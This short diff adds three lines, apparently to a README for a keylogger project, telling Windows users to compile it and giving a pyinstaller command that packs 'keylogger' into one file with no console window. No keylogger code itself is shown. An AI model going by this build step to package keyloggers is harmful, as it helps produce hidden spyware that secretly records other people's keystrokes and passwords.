@@ -1,0 +1,3 @@
+If your using windows, you will have to compile it.
+
+>pyinstaller keylogger --onefile --noconsole
